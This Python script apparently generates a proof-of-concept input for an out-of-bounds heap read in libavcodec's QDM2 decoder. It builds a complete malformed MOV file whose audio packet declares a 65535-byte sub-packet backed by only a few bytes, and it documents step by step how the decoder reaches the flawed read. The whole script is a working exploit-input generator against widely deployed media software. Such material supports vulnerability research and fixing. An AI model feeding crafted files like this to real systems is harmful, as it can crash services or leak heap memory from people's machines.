#!/usr/bin/env python3
"""
PoC generator for VULN-001: CWE-125 OOB Heap Read in qdm2_decode_super_block()
libavcodec/qdm2.c lines 1181-1243

Vulnerability: qdm2_decode_sub_packet_header() reads a 2-byte size field
(header.size up to 65535) from compressed data. Then:
    init_get_bits8(&gb, header.data, header.size)
creates a GetBitContext claiming up to 524280 bits but backed by only a few
bytes of real data. Subsequent get_bits() calls read far beyond the actual
allocated buffer via AV_RL32(s->buffer + (s->index>>3)).

Trigger: crafted MOV file with QDM2 audio where:
  1. QDCA extradata sets checksum_size=4 (minimum valid value > 1)
  2. Audio packet superblock header byte has bit7 set (2-byte size follows),
     with size=0xFFFF (65535), far beyond actual packet data.
"""

import struct
import sys
import os


def be32(v):
    return struct.pack('>I', v)


def be16(v):
    return struct.pack('>H', v)


def atom(tag, content):
    """Build a QuickTime/ISOBMF atom: size(4BE) + tag(4) + content."""
    if isinstance(tag, str):
        tag = tag.encode('ascii')
    size = 8 + len(content)
    return struct.pack('>I', size) + tag + content


# ─── EXTRADATA (wave atom content passed to QDM2 decoder) ──────────────────
#
# qdm2_decode_init searches for the 8-byte pattern 'frmaQDM2' in extradata.
# After finding it, it reads the QDCA chunk for codec parameters.
#
# Layout within wave atom content (passed as avctx->extradata):
#   frma sub-atom  : 12 bytes
#   QDCA sub-atom  : 36 bytes
#   padding        :  4 bytes  (so total >= 52 for QDCA size check to pass)
#
# Key parameters:
#   checksum_size = 4  → the audio packet must be >= 4 bytes
#                        and compressed_size = 4 when decoding
#   fft_size = 64      → fft_order = av_log2(64)+1 = 7  (in range [7,9]) ✓
#   group_size = 512   → frame_size = 32 ≤ 512 ✓
#   fft_size == 1<<(fft_order-1) = 64 ✓

CHANNELS     = 2
SAMPLERATE   = 44100
BITRATE      = 96000
GROUP_SIZE   = 512
FFT_SIZE     = 64
CHECKSUM_SIZE = 4     # must be > 1; kept tiny to maximize buffer-size mismatch

frma_box  = atom('frma', b'QDM2')   # 12 bytes

qdca_data = (
    be32(1)            +  # unknown = 1
    be32(CHANNELS)     +  # nb_channels
    be32(SAMPLERATE)   +  # sample_rate
    be32(BITRATE)      +  # bit_rate
    be32(GROUP_SIZE)   +  # group_size   (block_size in comment)
    be32(FFT_SIZE)     +  # fft_size     (frame_size in comment)
    be32(CHECKSUM_SIZE)   # checksum_size (packet_size in comment)
)
qdca_box = atom('QDCA', qdca_data)  # 36 bytes

# wave content = frma(12) + QDCA(36) + 4-byte pad = 52 bytes
# The QDCA size field (36) must be <= bytestream2_get_bytes_left() after
# reading the size; with 52 bytes total and 'frmaQDM2' at offset 4:
#   bytes_left before skip = 52-4 = 48 >= 44 ✓
#   skip 8: bytes_left = 40
#   read QDCA size (4): bytes_left = 36;  36 > 36 → FALSE ✓
wave_content = frma_box + qdca_box + b'\x00\x00\x00\x00'  # 52 bytes
wave_box     = atom('wave', wave_content)                   # 60 bytes


# ─── CRAFTED AUDIO PACKET (mdat payload, CHECKSUM_SIZE bytes) ────────────────
#
# In qdm2_decode():
#   q->compressed_data = packet_data  (points to our 4 bytes)
#   q->compressed_size = checksum_size = 4
#
# In qdm2_decode_super_block():
#   init_get_bits8(&outer_gb, compressed_data, 4)   → 32 available bits
#   qdm2_decode_sub_packet_header(&outer_gb, &header):
#     type    = get_bits(8) = 0x83  → type = 0x83&0x7f = 3, bit7 set
#     size_hi = get_bits(8) = 0xFF
#     size_lo = get_bits(8) = 0xFF  → header.size = 0xFFFF = 65535
#     header.data = &compressed_data[3]   (only 1 real byte left)
#
#   header.type = 3  (passes type check: 2 <= 3 < 8)
#   header.type != 2/4/5  → no checksum read
#
#   *** VULNERABLE CALL ***
#   init_get_bits8(&gb, header.data, 65535)
#     → GetBitContext claims 65535*8 = 524280 bits
#     → actual allocation: CHECKSUM_SIZE + AV_INPUT_BUFFER_PADDING_SIZE
#                        = 4 + 64 = 68 bytes from packet start
#     → accessible from header.data (&packet[3]): 68-3 = 65 bytes
#     → mismatch: 65535 claimed vs 65 accessible (ratio 1008x)
#
#   packet_bytes = compressed_size - 3 = 1 > 0  → inner loop runs
#   Inner loop iteration i=0:
#     qdm2_decode_sub_packet_header(&gb, packet):
#       type = get_bits(8) = packet[3] = 0x0D (type 13)
#       size = get_bits(8) = packet[4] = 0x00 (padding, zero)
#     → packet->type = 13 triggers fft_level_exp reads from gb
#       for j in range(6): fft_level_exp[j] = get_bits(&gb, 6)
#       → reads from header.data[2..6] (all padding, zeros)
#     sub_packet_size = 0+2=2 > packet_bytes(1) → type 13 not 10/11/12 → break
#
#   Result: gb backed by 65 real+padding bytes but claiming 65535 bytes.
#   Reads from padding (zero memory) occur. With ASAN build, any read
#   advancing the bit-index past the 68-byte allocation triggers detection.
#
# Packet bytes: [type_with_bit7][size_hi][size_lo][inner_type_13]
AUDIO_PACKET = bytes([
    0x83,   # outer type = 3 (no checksum), bit7 set → 2-byte size
    0xFF,   # size high byte
    0xFF,   # size low byte  →  header.size = 0xFFFF = 65535
    0x0D,   # inner packet type = 13 (fft_level_exp) in header.data[0]
])


# ─── MOV CONTAINER CONSTRUCTION ──────────────────────────────────────────────

# QDM2 AudioSampleEntry (ISO 14496-12 / QuickTime audio sample description)
# Standard audio header: 28 bytes + wave box
qdm2_audio_hdr = (
    b'\x00' * 6       +  # reserved (6)
    be16(1)           +  # data-reference-index = 1
    b'\x00' * 8       +  # reserved (8)
    be16(CHANNELS)    +  # channelcount
    be16(16)          +  # samplesize = 16-bit
    be16(0)           +  # compression_id
    be16(0)           +  # packet_size
    be32(SAMPLERATE << 16)  # samplerate (16.16 fixed-point)
)
qdm2_box = atom('QDM2', qdm2_audio_hdr + wave_box)

# stsd – Sample Description Box
stsd = atom('stsd',
    b'\x00\x00\x00\x00' +  # version=0, flags=0
    be32(1)             +  # entry count = 1
    qdm2_box
)

# stts – Time-to-Sample: 1 entry, 1 sample, duration = GROUP_SIZE
stts = atom('stts',
    b'\x00\x00\x00\x00' +  # version+flags
    be32(1)             +  # entry count = 1
    be32(1)             +  # sample count = 1
    be32(GROUP_SIZE)       # sample duration
)

# stsc – Sample-to-Chunk: 1 entry, all samples in chunk 1, 1 sample/chunk
stsc = atom('stsc',
    b'\x00\x00\x00\x00' +  # version+flags
    be32(1)             +  # entry count = 1
    be32(1)             +  # first chunk = 1
    be32(1)             +  # samples per chunk = 1
    be32(1)                # sample description index = 1
)

# stsz – Sample Size: constant size = CHECKSUM_SIZE (4), 1 sample
stsz = atom('stsz',
    b'\x00\x00\x00\x00' +  # version+flags
    be32(CHECKSUM_SIZE) +  # sample_size (constant) = 4
    be32(1)                # sample_count = 1
)

# stco – Chunk Offset: placeholder, will be patched after moov size is known
STCO_PLACEHOLDER = atom('stco',
    b'\x00\x00\x00\x00' +  # version+flags
    be32(1)             +  # entry count = 1
    be32(0xDEADBEEF)       # placeholder offset
)

stbl = atom('stbl', stsd + stts + stsc + stsz + STCO_PLACEHOLDER)

# dinf/dref – self-contained file
url_atom = atom('url ', b'\x00\x00\x00\x01')  # self-referential URL flag=1
dref = atom('dref', b'\x00\x00\x00\x00' + be32(1) + url_atom)
dinf = atom('dinf', dref)

# smhd – Sound Media Information Header
smhd = atom('smhd',
    b'\x00\x00\x00\x00' +  # version+flags
    be16(0)             +  # balance
    be16(0)                # reserved
)

minf = atom('minf', smhd + dinf + stbl)

# hdlr – Handler Reference (sound)
hdlr = atom('hdlr',
    b'\x00\x00\x00\x00' +  # version+flags
    b'\x00\x00\x00\x00' +  # pre_defined
    b'soun'             +  # handler_type
    b'\x00' * 12       +  # reserved
    b'\x00'               # name (empty string, null-terminated)
)

# mdhd – Media Header
mdhd = atom('mdhd',
    b'\x00\x00\x00\x00' +  # version+flags
    be32(0)             +  # creation_time
    be32(0)             +  # modification_time
    be32(SAMPLERATE)    +  # timescale
    be32(GROUP_SIZE)    +  # duration (in timescale units)
    be16(0x55C4)        +  # language = 'und'
    be16(0)                # pre_defined
)

mdia = atom('mdia', mdhd + hdlr + minf)

# tkhd – Track Header (version 0)
tkhd = atom('tkhd',
    be32(0x00000003)    +  # version=0, flags= enabled(1) + in-movie(2)
    be32(0)             +  # creation_time
    be32(0)             +  # modification_time
    be32(1)             +  # track_id = 1
    be32(0)             +  # reserved
    be32(GROUP_SIZE)    +  # duration (in movie timescale units)
    b'\x00' * 8        +  # reserved
    be16(0)             +  # layer
    be16(0)             +  # alternate_group
    be16(0x0100)        +  # volume = 1.0
    be16(0)             +  # reserved
    # 3x3 Unity matrix (16.16 fixed-point):
    be32(0x00010000) + be32(0) + be32(0) +
    be32(0) + be32(0x00010000) + be32(0) +
    be32(0) + be32(0) + be32(0x40000000) +
    be32(0)             +  # width
    be32(0)                # height
)

trak = atom('trak', tkhd + mdia)

# mvhd – Movie Header (version 0)
mvhd = atom('mvhd',
    b'\x00\x00\x00\x00' +  # version+flags
    be32(0)             +  # creation_time
    be32(0)             +  # modification_time
    be32(SAMPLERATE)    +  # timescale
    be32(GROUP_SIZE)    +  # duration
    be32(0x00010000)    +  # rate = 1.0
    be16(0x0100)        +  # volume = 1.0
    b'\x00' * 10       +  # reserved
    # 3x3 Unity matrix:
    be32(0x00010000) + be32(0) + be32(0) +
    be32(0) + be32(0x00010000) + be32(0) +
    be32(0) + be32(0) + be32(0x40000000) +
    b'\x00' * 24       +  # pre_defined
    be32(2)                # next_track_id
)

# ─── Build moov to determine its size for stco patch ─────────────────────────
moov_content_placeholder = mvhd + trak
moov_placeholder = atom('moov', moov_content_placeholder)

# ftyp – File Type Box
ftyp = atom('ftyp',
    b'M4A '            +  # major_brand
    be32(0x00000200)   +  # minor_version
    b'M4A ' + b'mp42' + b'isom'  # compatible brands
)

# mdat – Media Data Box (contains the crafted audio packet)
mdat_header_size = 8
mdat = atom('mdat', AUDIO_PACKET)

# Compute the offset where mdat data starts
# = len(ftyp) + len(moov) + mdat_header_size
moov_size = len(moov_placeholder)
mdat_data_offset = len(ftyp) + moov_size + mdat_header_size

# ─── Rebuild stco with correct offset, then rebuild moov ─────────────────────
stco_fixed = atom('stco',
    b'\x00\x00\x00\x00' +  # version+flags
    be32(1)             +  # entry count = 1
    be32(mdat_data_offset)  # chunk offset (points to first byte of AUDIO_PACKET)
)

stbl_fixed = atom('stbl', stsd + stts + stsc + stsz + stco_fixed)
minf_fixed = atom('minf', smhd + dinf + stbl_fixed)
mdia_fixed = atom('mdia', mdhd + hdlr + minf_fixed)
trak_fixed = atom('trak', tkhd + mdia_fixed)
moov_fixed = atom('moov', mvhd + trak_fixed)

# Verify size didn't change (it shouldn't since we replaced placeholder with same-size value)
assert len(moov_fixed) == moov_size, \
    f"moov size changed: {len(moov_fixed)} vs {moov_size}"

# ─── Assemble final MOV file ─────────────────────────────────────────────────
mov_data = ftyp + moov_fixed + mdat

output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           'vuln_001_input.mov')
with open(output_path, 'wb') as f:
    f.write(mov_data)

print(f"[+] Crafted MOV written to: {output_path}")
print(f"[+] File size: {len(mov_data)} bytes")
print(f"[+] ftyp: {len(ftyp)} bytes")
print(f"[+] moov: {len(moov_fixed)} bytes")
print(f"[+] mdat: {len(mdat)} bytes (data offset = {mdat_data_offset})")
print(f"[+] Audio packet: {AUDIO_PACKET.hex()}")
print(f"[+] CHECKSUM_SIZE = {CHECKSUM_SIZE}  (checksum_size in QDCA extradata)")
print()
print("[+] Vulnerability trigger summary:")
print(f"    Outer superblock type byte: 0x{AUDIO_PACKET[0]:02X}")
print(f"    → type = {AUDIO_PACKET[0] & 0x7F} (bit7 set → 2-byte size)")
print(f"    → header.size = 0x{AUDIO_PACKET[1]:02X}{AUDIO_PACKET[2]:02X} = "
      f"{AUDIO_PACKET[1] << 8 | AUDIO_PACKET[2]}")
print(f"    → header.data = &packet[3] (only 1 real byte, plus 64-byte padding)")
print(f"    GetBitContext claims {(AUDIO_PACKET[1]<<8|AUDIO_PACKET[2])*8} bits "
      f"but only {(CHECKSUM_SIZE - 3 + 64) * 8} bits accessible")
